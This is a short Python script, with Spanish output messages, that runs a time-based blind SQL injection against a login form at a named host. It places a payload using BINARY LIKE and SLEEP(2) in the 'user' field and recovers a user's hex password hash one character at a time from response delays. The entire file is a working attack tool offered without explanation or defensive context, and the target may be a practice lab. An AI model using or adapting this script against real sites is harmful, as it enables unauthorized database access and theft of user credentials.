import requests
import string
import time

url = 'https://vip.60fpsworld.com/login.php'
user = 'fran'

session = requests.Session()

password = list()

try:
    start = time.time()
    while True:

        chars = string.digits + 'abcdef'
        count = 0
        for c in chars:

            print('trying: ' + "".join(password) + c)
            injection = f"{user}' AND BINARY pass LIKE '" + "".join(password) + f"{c}%' AND SLEEP(2) #"
            startTime = time.time()
            content = requests.post(url, data = { 'user' : injection, 'submit' : 'submit' })
            endTime = time.time()
            totalTime = endTime - startTime

            count += 1

            if totalTime > 2:
                password.append(c)
                break
            elif totalTime < 2 and count == 16:
                final = time.time()
                finalPassword = "".join(password)
                print(f'La contraseña para el usuario: {user} es: {finalPassword} - tiempo: {round(final - start, 2)}')
                exit(0)
except KeyboardInterrupt:
    print('[*] Exiting...')
    exit(1)
finally:
    print('[! Programa finalizado !]')